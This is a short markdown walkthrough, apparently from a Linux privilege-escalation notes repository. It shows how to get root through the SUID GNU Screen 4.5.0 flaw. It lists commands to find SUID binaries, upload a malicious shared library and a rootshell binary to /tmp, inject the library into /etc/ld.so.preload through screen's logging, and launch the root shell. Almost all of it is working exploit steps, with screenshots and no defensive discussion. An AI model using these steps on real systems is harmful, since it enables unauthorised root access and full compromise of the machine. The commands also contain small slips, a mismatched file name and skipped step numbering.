```bash
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```
![image](https://github.com/Grizzy529/Linux-PrivEsc/assets/102862377/ab99952d-a793-47a9-889f-b0cc5152ad2c)

1. Upload `libhax.so` and `rootshell` to target machine in `/tmp` directory
2. Also change the permission of both the file to executable
```
chmod +x rootshell
chmod +x libhax
```
4. Run Below Commands
```bash
cd /etc
umask 000
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
/tmp/rootshell
id
```
![image](https://github.com/Grizzy529/Linux-PrivEsc/assets/102862377/7cad8e25-8076-4a96-9a7e-88499f9df884)
